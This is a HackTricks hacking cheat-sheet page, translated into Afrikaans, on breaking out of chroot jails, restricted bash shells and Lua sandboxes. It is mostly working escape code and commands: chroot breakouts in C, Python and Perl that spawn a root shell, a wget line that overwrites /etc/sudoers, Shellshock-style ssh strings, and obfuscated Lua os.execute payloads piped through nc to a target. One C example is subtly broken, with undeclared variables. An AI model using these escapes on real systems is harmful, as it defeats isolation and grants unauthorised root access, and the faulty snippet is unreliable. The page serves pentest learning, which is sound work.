# Ontsnapping uit Jails

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **GTFOBins**

**Soek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of jy enige binêre lêer met "Shell" eienskap kan uitvoer**

## Chroot Ontsnappings

Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Die chroot-meganisme is **nie bedoel om** teen opsetlike manipulasie deur **bevoorregte** (**root**) **gebruikers** te beskerm nie. Op die meeste stelsels stap chroot-kontekste nie behoorlik op nie en chroot-programme **met voldoende voorregte kan 'n tweede chroot uitvoer om te ontsnap**.\
Gewoonlik beteken dit dat jy as root binne die chroot moet wees om te ontsnap.

{% hint style="success" %}
Die **werktuig** [**chw00t**](https://github.com/earthquake/chw00t) is geskep om die volgende scenarios te misbruik en te ontsnap uit `chroot`.
{% endhint %}

### Root + Huidige Werkspad

{% hint style="warning" %}
As jy as **root** binne 'n chroot is, **kan jy ontsnap** deur 'n **ander chroot te skep**. Dit is omdat 2 chroots nie gelyktydig kan bestaan ​​(in Linux), so as jy 'n vouer skep en dan 'n nuwe chroot skep op daardie nuwe vouer terwyl jy **buite dit is**, sal jy nou **buite die nuwe chroot** wees en dus sal jy in die FS wees.

Dit gebeur gewoonlik omdat chroot NIE jou werkspad na die aangeduide een skuif nie, sodat jy 'n chroot kan skep maar buite dit kan wees.
{% endhint %}

Gewoonlik sal jy nie die `chroot` binêre lêer binne 'n chroot-gevangenis vind nie, maar jy **kan 'n binêre lêer saamstel, oplaai en uitvoer**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Bewaarde fd

{% hint style="warning" %}
Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n lêerbeskrywer na die huidige gids** en dan **skep die chroot in 'n nuwe vouer**. Uiteindelik, aangesien hy **toegang** het tot daardie **FD** **buite** die chroot, het hy toegang daartoe en hy **ontsnap**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD kan oorgedra word oor Unix-domeinsokkels, so:

* Skep 'n kinderproses (fork)
* Skep UDS sodat ouer en kind kan kommunikeer
* Voer chroot uit in kinderproses in 'n ander vouer
* In ouer proses, skep 'n FD van 'n vouer wat buite die nuwe kinderproses chroot is
* Dra daardie FD oor na die kinderproses deur die UDS te gebruik
* Kindproses verander na daardie FD, en omdat dit buite sy chroot is, sal hy die tronk ontsnap
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Koppel die hooftoestel (/) in 'n gids binne die chroot
* Chroot na daardie gids

Dit is moontlik in Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Koppel procfs in 'n gids binne die chroot (as dit nog nie daar is nie)
* Soek na 'n pid wat 'n ander hoof-/cwd-inskrywing het, soos: /proc/1/root
* Chroot na daardie inskrywing
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Skep 'n Fork (kinderproses) en chroot na 'n ander vouer dieper in die FS en CD daarop
* Vanuit die ouerproses, skuif die vouer waar die kinderproses in 'n vouer voor die chroot van die kinders is
* Hierdie kinderproses sal homself buite die chroot vind
{% endhint %}

### ptrace

{% hint style="warning" %}
* 'n Tyd gelede kon gebruikers sy eie prosesse vanuit 'n proses van homself foutopspoor... maar dit is nie meer standaard moontlik nie
* Hoe dan ook, as dit moontlik is, kan jy ptrace in 'n proses en 'n shellkode daarin uitvoer ([sien hierdie voorbeeld](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Tronke

### Enumerasie

Kry inligting oor die tronk:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Wysig PATH

Kyk of jy die PATH omgewingsveranderlike kan wysig.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Gebruik van vim
```bash
:set shell=/bin/sh
:shell
```
### Skep skripsie

Kyk of jy 'n uitvoerbare lêer kan skep met _/bin/bash_ as inhoud
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Kry bash vanaf SSH

Indien jy toegang verkry via ssh, kan jy hierdie truuk gebruik om 'n bash-skoot uit te voer:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Verklaar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Jy kan byvoorbeeld die sudoers-lêer oorskryf
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ander truuks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Dit kan ook interessant wees die bladsy:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Tronke

Truuks oor ontsnapping uit python tronke op die volgende bladsy:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Tronke

Op hierdie bladsy kan jy die globale funksies vind waar jy toegang tot het binne lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval met bevel uitvoering:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
### 'n Paar truuks om funksies van 'n biblioteek te **roep sonder om punte te gebruik**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Lys funksies van 'n biblioteek:
```bash
for k,v in pairs(string) do print(k,v) end
```
Merk op dat elke keer as jy die vorige eenregelige kode in 'n **verskillende lua-omgewing uitvoer, die volgorde van die funksies verander**. Daarom, as jy 'n spesifieke funksie moet uitvoer, kan jy 'n brute force-aanval uitvoer deur verskillende lua-omgewings te laai en die eerste funksie van die biblioteek aan te roep:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Kry 'n interaktiewe lua-skul**: As jy binne 'n beperkte lua-skul is, kan jy 'n nuwe lua-skul (en hopelik onbeperkte) kry deur die volgende te skakel:
```bash
debug.debug()
```
## Verwysings

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Dias: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
